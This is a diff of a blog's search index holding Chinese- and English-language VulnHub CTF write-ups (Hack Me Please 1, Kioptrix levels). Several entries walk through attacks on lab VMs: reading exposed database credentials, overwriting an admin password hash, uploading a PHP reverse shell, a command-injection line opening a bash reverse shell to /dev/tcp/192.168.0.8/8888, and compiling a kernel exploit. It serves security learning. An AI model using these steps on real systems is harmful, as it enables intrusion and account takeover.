@@ -4,7 +4,6 @@
     <title>HACK ME PLEASE: 1</title>
     <url>/2024/11/30/HACK-ME-PLEASE-1/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a class="link"   href="https://www.vulnhub.com/entry/hack-me-please-1,731/" >靶機簡介<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<p><strong>Description</strong><br>Difficulty: Easy<br>Description: An easy box totally made for OSCP. No bruteforce is required.<br>Aim: To get root shell</p>
 <p><strong>Virtual Machine</strong><br>Format: Virtual Machine (Virtualbox - OVA)<br>Operating System: Linux</p>
 <p><strong>Networking</strong><br>DHCP service: Enabled<br>IP address: Automatically assign</p>
 <br>
@@ -78,7 +77,7 @@
                      
                 ></p>
 <p>步驟三跟你說套件會裝在 &#x2F;seeddms51x&#x2F;seeddms-5.1.22&#x2F; 下，那就試試用瀏覽器查看一下以下連結</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://&lt;CTF_Machine_IP&gt;/seeddms51x/seeddms-5.1.22/conf/</span><br><span class="line">http://10.0.2.15/seeddms51x/seeddms-5.1.22/conf/</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://&lt;CTF_Machine_IP&gt;/seeddms51x/seeddms-5.1.22/conf/</span><br><span class="line">http://10.0.2.15/seeddms51x/seeddms-5.1.22/conf/</span><br></pre></td></tr></table></figure></div>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
@@ -86,7 +85,7 @@
                      
                 ></p>
 <p>也可能是去掉子版本的路徑</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://&lt;CTF_Machine_IP&gt;/seeddms51x/conf/</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://&lt;CTF_Machine_IP&gt;/seeddms51x/conf/</span><br></pre></td></tr></table></figure></div>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
@@ -116,7 +115,7 @@
                      
                 ></p>
 <p>有沒有看到上面的註解？bingo，找到設定檔的預設路徑了。<br>串起前面 403 錯誤的 URL 前綴：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://&lt;CTF_Machine_IP&gt;/seeddms51x/conf/settings.xml</span><br><span class="line">http://10.0.2.15/seeddms51x/conf/settings.xml</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://&lt;CTF_Machine_IP&gt;/seeddms51x/conf/settings.xml</span><br><span class="line">http://10.0.2.15/seeddms51x/conf/settings.xml</span><br></pre></td></tr></table></figure></div>
 <p>What a wonderful world! 有沒有看到資料庫的設定了。<br><img  
                      lazyload
                      src="/images/loading.svg"
@@ -126,13 +125,13 @@
 <br>
 <br>
 
-<h3 id="步驟六：連上資料庫看看"><a href="#步驟六：連上資料庫看看" class="headerlink" title="步驟六：連上資料庫看看"></a>步驟六：連上資料庫看看</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">mysql <span class="operator">-</span>h <span class="operator">&lt;</span>CTF_Machine_IP<span class="operator">&gt;</span> <span class="operator">-</span>u <span class="operator">&lt;</span>dbUser<span class="operator">&gt;</span> <span class="operator">-</span>p</span><br><span class="line">mysql <span class="operator">-</span>h <span class="number">10.0</span><span class="number">.2</span><span class="number">.15</span> <span class="operator">-</span>u seeddms <span class="operator">-</span>p</span><br></pre></td></tr></table></figure></div>
+<h3 id="步驟六：連上資料庫看看"><a href="#步驟六：連上資料庫看看" class="headerlink" title="步驟六：連上資料庫看看"></a>步驟六：連上資料庫看看</h3><div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">mysql <span class="operator">-</span>h <span class="operator">&lt;</span>CTF_Machine_IP<span class="operator">&gt;</span> <span class="operator">-</span>u <span class="operator">&lt;</span>dbUser<span class="operator">&gt;</span> <span class="operator">-</span>p</span><br><span class="line">mysql <span class="operator">-</span>h <span class="number">10.0</span><span class="number">.2</span><span class="number">.15</span> <span class="operator">-</span>u seeddms <span class="operator">-</span>p</span><br></pre></td></tr></table></figure></div>
 <p>到處看看</p>
-<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> DATABASES;</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> DATABASES;</span><br></pre></td></tr></table></figure></div>
 <p>有一個 seeddms 資料庫</p>
-<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">USE seeddms;</span><br><span class="line"><span class="keyword">SHOW</span> TABLES;</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">USE seeddms;</span><br><span class="line"><span class="keyword">SHOW</span> TABLES;</span><br></pre></td></tr></table></figure></div>
 <p>所有表格都是 tbl 開頭，只有一個 users 不是，很有可能就是管理者的資料</p>
-<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users;</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users;</span><br></pre></td></tr></table></figure></div>
 <p>暫時沒有用，不管，先記下來再說。<br><img  
                      lazyload
                      src="/images/loading.svg"
@@ -140,7 +139,7 @@
                      
                 ></p>
 <p>從 tbl 系列中，又看到跟使用者有關的 tblusers 資料表。</p>
-<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> tblusers;</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> tblusers;</span><br></pre></td></tr></table></figure></div>
 <p>看到前台的兩個帳號了，guest 沒密碼不能登入，權限可能也不夠，admin 的權<br>限比較香。<br><img  
                      lazyload
                      src="/images/loading.svg"
@@ -158,10 +157,10 @@
 </li>
 <li><p>方法二：沒猜到密碼怎麼辦？改掉它，或是自己加一個。這只講改掉的流程，insert 的指令太長不打了。使用 md5sum 工具或網頁的MD5 生成工具，把你要的密碼雜湊成 MD5。</p>
 <p>  再來就是直接覆蓋資料庫了。</p>
-  <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> tblUsers</span><br><span class="line"><span class="keyword">SET</span> pwd<span class="operator">=</span><span class="string">&#x27;21232f297a57a5a743894a0e4a801fc3&#x27;</span></span><br><span class="line"><span class="keyword">WHERE</span> login<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>;</span><br></pre></td></tr></table></figure></div>
+  <div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> tblUsers</span><br><span class="line"><span class="keyword">SET</span> pwd<span class="operator">=</span><span class="string">&#x27;21232f297a57a5a743894a0e4a801fc3&#x27;</span></span><br><span class="line"><span class="keyword">WHERE</span> login<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>;</span><br></pre></td></tr></table></figure></div>
 <p>  注意：pwd 的字串記得改成你自己的。</p>
 <p>  123456的MD5：</p>
-  <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">e10adc3949ba59abbe56e057f20f883e</span><br></pre></td></tr></table></figure></div>
+  <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">e10adc3949ba59abbe56e057f20f883e</span><br></pre></td></tr></table></figure></div>
 <p>  <img  
                      lazyload
                      src="/images/loading.svg"
@@ -174,7 +173,7 @@
 <br>
 
 <h3 id="步驟八：登入前台"><a href="#步驟八：登入前台" class="headerlink" title="步驟八：登入前台"></a>步驟八：登入前台</h3><p>可以去登入看看了，根據原始檔案說明，應該在這</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://&lt;CTF_Machine_IP&gt;/seeddms51x/seeddms-5.1.22/</span><br><span class="line">http://10.0.2.15/seeddms51x/seeddms-5.1.22/</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://&lt;CTF_Machine_IP&gt;/seeddms51x/seeddms-5.1.22/</span><br><span class="line">http://10.0.2.15/seeddms51x/seeddms-5.1.22/</span><br></pre></td></tr></table></figure></div>
 <p>看一下你的身分<br><img  
                      lazyload
                      src="/images/loading.svg"
@@ -186,7 +185,7 @@
 
 <h3 id="步驟九：上傳反向後門"><a href="#步驟九：上傳反向後門" class="headerlink" title="步驟九：上傳反向後門"></a>步驟九：上傳反向後門</h3><p>既然它是 PHP&#x2F;MySQL，我們就利用上傳功能，建立一個 php 反向後門來玩吧，從這邊下載人家寫好的 PHP webshell 工具：<br><a class="link"   href="https://pentestmonkey.net/tools/web-shells/php-reverse-shell" >https://pentestmonkey.net/tools/web-shells/php-reverse-shell<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>記得根據你攻擊端的 ip 與 port 修改檔案。</p>
 <p>Kali 端就不用複雜的 metasploit 了，簡單用 netcat 開個接口就夠用了</p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">nc -v -n -l -p 1234</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">nc -v -n -l -p 1234</span><br></pre></td></tr></table></figure></div>
 <p>-p 後面是你剛剛指定的 port 喔。<br><img  
                      lazyload
                      src="/images/loading.svg"
@@ -204,9 +203,9 @@
 
 
 <h3 id="步驟十：執行反向後門"><a href="#步驟十：執行反向後門" class="headerlink" title="步驟十：執行反向後門"></a>步驟十：執行反向後門</h3><p>上傳後的檔案，可以點擊下載，但好像無法執行怎麼辦？<br>繼續追蹤原始碼，裡面上傳的儲存位置，會在以下預設路徑</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://site.example.com/data/1048576/&lt;document_id&gt;/1.php</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://site.example.com/data/1048576/&lt;document_id&gt;/1.php</span><br></pre></td></tr></table></figure></div>
 <p><document_id> 可以從下載的 URL 中找到，而此機器的套件裝在<br>seeddms51x 目錄下，所以 URL 成了以下：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://&lt;CTF_Machine_IP&gt;/seeddms51x/data/1048576/&lt;document_id&gt;/1.php</span><br><span class="line">http://10.0.2.15/seeddms51x/data/1048576/8/1.php</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://&lt;CTF_Machine_IP&gt;/seeddms51x/data/1048576/&lt;document_id&gt;/1.php</span><br><span class="line">http://10.0.2.15/seeddms51x/data/1048576/8/1.php</span><br></pre></td></tr></table></figure></div>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
@@ -230,7 +229,7 @@
 <br>
 
 <h3 id="步驟十一：越權"><a href="#步驟十一：越權" class="headerlink" title="步驟十一：越權"></a>步驟十一：越權</h3><p>你現在是已 www-data 身分進入系統，習慣上查一下 &#x2F;etc&#x2F;passwd，發現有個使用者帳號 saket。ㄟ….跟剛剛 users 資料表的一樣耶。那就</p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">which python3</span><br><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27; #這步驟很重要，一般terminal無法輸入sudo密碼</span><br><span class="line">cd /etc</span><br><span class="line">cat passwd</span><br><span class="line">su - saket</span><br><span class="line"><span class="meta prompt_">Saket@#</span><span class="language-bash"><span class="variable">$1337</span></span></span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">which python3</span><br><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27; #這步驟很重要，一般terminal無法輸入sudo密碼</span><br><span class="line">cd /etc</span><br><span class="line">cat passwd</span><br><span class="line">su - saket</span><br><span class="line"><span class="meta prompt_">Saket@#</span><span class="language-bash"><span class="variable">$1337</span></span></span><br></pre></td></tr></table></figure></div>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
@@ -238,9 +237,9 @@
                      
                 ></p>
 <p>密碼貼過來，WTF，進去了。再 try try 管理者是否是預設第一個帳號擁有sudo 的權限(Ubuntu 的特性)。</p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -i</span><br><span class="line"><span class="meta prompt_">Saket@#</span><span class="language-bash"><span class="variable">$1337</span></span></span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -i</span><br><span class="line"><span class="meta prompt_">Saket@#</span><span class="language-bash"><span class="variable">$1337</span></span></span><br></pre></td></tr></table></figure></div>
 <p>密碼再貼一次。<br>恭喜恭喜恭喜你!!!!! 確認一下準備收工了</p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">id</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">id</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure></div>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
@@ -254,10 +253,78 @@
       </tags>
   </entry>
   <entry>
+    <title>KIOPTRIX: LEVEL 1.3</title>
+    <url>/2024/11/30/KIOPTRIX-LEVEL-1-3/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a class="link"   href="https://www.vulnhub.com/entry/kioptrix-level-13-4%2C25/" >Target<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><strong>Virtual Machine</strong><br>Format: Virtual Machine (VMware)<br>Operating System: Linux</p>
+<p><strong>Networking</strong><br>DHCP service: Enabled<br>IP address: Automatically assign</p>
+<br>
+<br>
+
+<h2 id="Former-Job"><a href="#Former-Job" class="headerlink" title="Former Job"></a><strong>Former Job</strong></h2><ul>
+<li>Import to VMware</li>
+<li>Virtual machine configuration with different networks-Bridged(<a class="link"   href="https://blog.csdn.net/Attsky/article/details/109320325" >Network<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>、<a class="link"   href="https://blog.csdn.net/qq1069380146/article/details/111995334" >IP<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>)<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/BkJ6mp_tp.png"
+                      width="50%" height="40%"
+                >
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/rJOQumtKT.png"
+                      width="50%" height="40%"
+                ></li>
+<li><a class="link"   href="https://youtu.be/6P6ff8onNzk?si=xB0xUZfX43sZ2Zmk" >Reference<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+</ul>
+<br>
+<br>
+
+<h2 id="Step-1-Scan"><a href="#Step-1-Scan" class="headerlink" title="Step 1: Scan"></a><strong>Step 1: Scan</strong></h2><ol>
+<li>Confirm my IP address.<br><code>ifconfig</code><br>I found that my IP address.<code>192.168.1.113</code>。<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/vulnhub/4/0.png"
+                      width="600" height="800"
+                ></li>
+<li>Search the target.<br><code>sudo netdiscover -r 192.168.1.0/24</code><br>I think the target is 192.168.1.112<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/vulnhub/4/1.png"
+                      width="600" height="800"
+                ></li>
+<li>Nmap scan the services.<br><code>sudo nmap -A -T4 192.168.1.112</code><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/vulnhub/4/2.png"
+                      width="600" height="800"
+                ></li>
+</ol>
+<h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a><strong>Step 2</strong></h2><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a><strong>Step 3</strong></h2><h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a><strong>Step 4</strong></h2><h2 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a><strong>Step 5</strong></h2>]]></content>
+      <tags>
+        <tag>VulnHub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MyBook</title>
+    <url>/2024/12/08/MyBook/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><ul>
+<li><a href="../picoCTF">picoCTF</a></li>
+<li><a href="../VulnHub">VulnHub</a></li>
+<li><a href="../PortSwigger">PortSwigger</a></li>
+</ul>
+<p><br><br><br><br><br><br><br><br></p>
+<h3 id="Binary"><a href="#Binary" class="headerlink" title="Binary"></a>Binary</h3><p>…</p>
+<h3 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h3><ul>
+<li><a href="../Red-Team">Red Team</a></li>
+</ul>
+<p><br><br><br><br><br><br><br><br><br><br><br></p>
+]]></content>
+  </entry>
+  <entry>
     <title>KIOPTRIX: LEVEL 1.1</title>
     <url>/2024/11/30/KIOPTRIX-LEVEL-1-1/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a class="link" href="https://www.vulnhub.com/entry/kioptrix-level-11-2,23/">靶機簡介<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<p><strong>Description</strong><br>This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.</p>
 <p><strong>Virtual Machine</strong><br>Format: Virtual Machine (VMware)<br>Operating System: Linux</p>
 <p><strong>Networking</strong><br>DHCP service: Enabled<br>IP address: Automatically assign</p>
 <br>
@@ -287,23 +354,23 @@
 <p>參考 <a class="link" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse Shell Cheat Sheet<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。<br>與自己建立了一個 TCP 反向 shell 連接，將目標系統的<br>標準輸入、輸出和錯誤都與攻擊者的遠端位置相連接。</p>
 <p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ByeYzhjtT.png" alt="image"></p>
 <p>先打好<code>nc -nvlp 8888</code>送出再網頁輸入。<br><code>ping 127.0.0.1|bash -i &gt;&amp; /dev/tcp/192.168.0.8/8888 0&gt;&amp;1</code><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HycNH2jKa.png" alt="image"><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SkRfH3iKa.png" alt="image"></p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line">uname -a</span><br><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line">uname -a</span><br><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure></div>
 <p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HJvJunsYa.png" alt="image"><br>LSB 的全稱是 “Linux Standard Base”（Linux 標準基準）。LSB 是一個開放標準，定義了 Linux 操作系統的核心元件和應用程式的標準接口，以確保不同 Linux 發行版之間的二進制兼容性。<br><br><br><br></p>
-<h2 id="步驟四、搜索漏洞"><a href="#步驟四、搜索漏洞" class="headerlink" title="步驟四、搜索漏洞"></a>步驟四、搜索漏洞</h2><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit 2.6.9</span><br><span class="line">searchsploit CentOS 4.5</span><br></pre></td></tr></table></figure></div>
+<h2 id="步驟四、搜索漏洞"><a href="#步驟四、搜索漏洞" class="headerlink" title="步驟四、搜索漏洞"></a>步驟四、搜索漏洞</h2><div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit 2.6.9</span><br><span class="line">searchsploit CentOS 4.5</span><br></pre></td></tr></table></figure></div>
 <p>searchsploit 是 Exploit Database 中的一個工具，用於搜索漏洞利用程式（exploits）和Shellcode的資料庫。Exploit Database 是一個包含各種漏洞利用程式、Shellcode和相關資訊的公共資料庫，旨在協助渗透測試和安全研究。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rk2oYnjKp.png" alt="image"><br><br><br><br></p>
 <p><code>searchsploit -m linux_x86/local/9542.c</code></p>
 <p>searchsploit -m linux/local/9542.c 是一個使用 searchsploit 工具的命令。在這個命令中，-m 表示 “mirror”（鏡像），它的作用是將 Exploit Database 中路徑為 linux/local/9542.c 的漏洞利用程式文件複製到當前工作目錄。-m 選項使您能夠在不離開命令行的情況下複製漏洞利用程式文件。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/H1uqIpoYa.png" alt="image"></p>
 <br>
 <br>
 
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.0.8/9542.c</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.0.8/9542.c</span><br></pre></td></tr></table></figure></div>
 <p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HJbFVToFp.png" alt="image"></p>
 <p>因為沒有起相關http服務被拒絕，因此<code>pytho3 -m http.server 80</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BJmbp2itT.png" alt="image"></p>
 <p>再一次<code>wget http://192.168.0.8/9542.c</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HJA3Vaitp.png" alt="image"></p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ls</span><br><span class="line">gcc -o exploit 9542.c</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ls</span><br><span class="line">gcc -o exploit 9542.c</span><br></pre></td></tr></table></figure></div>
 <p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BkcfUpsFT.png" alt="image"></p>
 <p>如果想解warning，<code>echo &gt;&gt; 9542.c</code>這個命令利用了 echo 命令用於輸出文本，以及 &gt;&gt; 重定向操作符用於將輸出附加到文件末尾。當這個命令運行時，它將一個空字符串（即一個換行符號）添加到指定文件的末尾。這是一種快速且常見的方式，特別是當需要手動在文件末尾插入換行符號時。然而，這種方法僅限於向文件末尾添加換行符號，並假設文件 9542.c 已經存在。如果文件不存在，則這個命令將創建一個新文件。<br><br><br><br></p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">./exploit</span><br><span class="line">whoami</span><br><span class="line">id</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">./exploit</span><br><span class="line">whoami</span><br><span class="line">id</span><br></pre></td></tr></table></figure></div>
 <p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ryekITjKT.png" alt="image"></p>
 ]]></content>
       <tags>
@@ -314,16 +381,6 @@
     <title>KIOPTRIX: LEVEL 1.2</title>
     <url>/2024/11/30/KIOPTRIX-LEVEL-1-2/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a class="link" href="https://www.vulnhub.com/entry/kioptrix-level-12-3,24/">靶機簡介<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<p><strong>Description</strong><br>It’s been a while since the last Kioptrix VM challenge. Life keeps getting the way of these things you know.</p>
-<p>After the seeing the number of downloads for the last two, and the numerous videos showing ways to beat these challenges. I felt that 1.2 (or just level 3) needed to come out. Thank you to all that downloaded and played the first two. And thank you to the ones that took the time to produce video solutions of them. Greatly appreciated.</p>
-<p>As with the other two, this challenge is geared towards the beginner. It is however different. Added a few more steps and a new skill set is required. Still being the realm of the beginner I must add. The same as the others, there’s more then one way to “pwn” this one. There’s easy and not so easy. Remember… the sense of “easy” or “difficult” is always relative to ones own skill level. I never said these things were exceptionally hard or difficult, but we all need to start somewhere. And let me tell you, making these vulnerable VMs is not as easy as it looks…</p>
-<p>Important thing with this challenge. Once you find the IP (DHCP Client) edit your hosts file and point it to kioptrix3.com</p>
-<p>Under Windows, you would edit C:\Windows\System32\drivers\etc\hosts to look something like this:</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># localhost name resolution is handled within DNS itself.</span><br><span class="line">#   127.0.0.1 localhost</span><br><span class="line">#   ::1 localhost127.0.0.1 static3.cdn.ubi.com</span><br></pre></td></tr></table></figure></div>
-<p>192.168.1.102 kioptrix3.com</p>
-<p>Under Linux that would be /etc/hosts</p>
-<p>There’s a web application involved, so to have everything nice and properly displayed you really need to this.</p>
-<p>Hope you enjoy Kioptrix VM Level 1.2 challenge.</p>
 <p><strong>Virtual Machine</strong><br>Format: Virtual Machine (VMware)<br>Operating System: Linux</p>
 <p><strong>Networking</strong><br>DHCP service: Enabled<br>IP address: Automatically assign</p>
 <br>
@@ -344,11 +401,11 @@
 <p><code>whatweb 192.168.0.10</code>。觀察其中含有<code>HTTPServer</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HyswZvG96.png" alt="image"></p>
 <p>在Blog中觀察到有<code>http://kioptrix3.com/gallery</code>。<br>在Login中使用普通 SQL Injection 手法進不去。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SJzk4PM5a.png" alt="image"><br>觀察登入處最下方有<code>Proudly Powered by: LotusCMS</code>。<br><br><br><br></p>
 <h2 id="步驟二、針對其服務探索"><a href="#步驟二、針對其服務探索" class="headerlink" title="步驟二、針對其服務探索"></a>步驟二、針對其服務探索</h2><p><code>searchsploit LotusCMS</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BJZuSvMcp.png" alt="image"></p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole -q</span><br><span class="line">search Lotus</span><br><span class="line">search LotusCMS</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole -q</span><br><span class="line">search Lotus</span><br><span class="line">search LotusCMS</span><br></pre></td></tr></table></figure></div>
 <p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/r1HUIvz9p.png" alt="image"><br><br></p>
